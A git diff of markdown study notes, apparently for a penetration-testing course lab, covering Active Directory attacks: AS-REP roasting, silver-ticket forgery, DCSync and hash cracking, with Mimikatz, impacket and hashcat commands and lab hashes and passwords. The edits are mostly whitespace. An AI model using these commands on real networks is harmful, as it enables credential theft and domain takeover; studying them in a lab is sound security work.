@@ -1225,29 +1225,28 @@ Login to DC
   - Python  
     `kali@kali:~$ GetNPUsers.py -usersfile usernames.txt -dc-ip 192.168.188.70 -format hashcat -outputfile hashes.asreproast corp.com/`  
 - 👥 Silver tickets (Forge service tickets)
-  - 🔒 Goal: Access a specific service on a host using a forged Kerberos service ticket (TGS).
-  - connecting to **CLIENT75** via RDP as **jeff**   
-  - Local admin use Mimikatz to retrieve the **SPN password hash** of 'iis_service'
+  - 🔒 Goal: Access a specific service on a host using a forged Kerberos service ticket (TGS).  
+  - connecting to **CLIENT75** via RDP as **jeff**  
+  - Local admin use Mimikatz to retrieve the **SPN password hash** of 'iis_service'  
     `mimikatz # "privilege::debug" "sekurlsa::logonpasswords" exit`  #4d28cf5252d39971419580a51484ca09
-  - Retrieve **Domain SID** for current user
+  - Retrieve **Domain SID** for current user  
     `whoami /user whoami /user` #S-1-5-21-1987370270-658905905-1781884369-1105
-  - Retrieve **target SPN**: WEB04  
-  - Forge service ticket with user jeffadmin
+  - Retrieve **target SPN**: WEB04   
+  - Forge service ticket with user jeffadmin  
     `mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
-  - Listing Kerberos tickets
+  - Listing Kerberos tickets  
     `PS C:\Tools> klist` #jeffadmin
-  - Access the SMB share with the silver ticket
+  - Access the SMB share with the silver ticket  
     `PS C:\Tools> iwr -UseDefaultCredentials http://web04`  
-- 👥 DCSync attack
+- 👥 DCSync attack  
   - 🔒 Goal: Retrieve NTLM / Kerberos password hashes of domain users without touching the DC database. Required domain admin (DC01 to get all user hashes) or Replicating Directory Changes (RDC) right.  
-  - connecting to **CLIENT75** as **jeffadmin**
-  - Obtain credentials of dave and administrator
+  - connecting to **CLIENT75** as **jeffadmin**  
+  - Obtain credentials of dave and administrator  
     `mimikatz # "privilege::debug" "lsadump::dcsync /user:corp\dave" exit`  
-  - crack the hash **1000 hash.dcsync**
+  - crack the hash **1000 hash.dcsync**  
     `hashcat -m 1000 hash.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` #Flowers1
-  - Alternate tool - secretsdump
+  - Alternate tool - secretsdump  
     `kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`  
-  - dd
 
 # Lateral movement  
 1. DC1 --> MS02
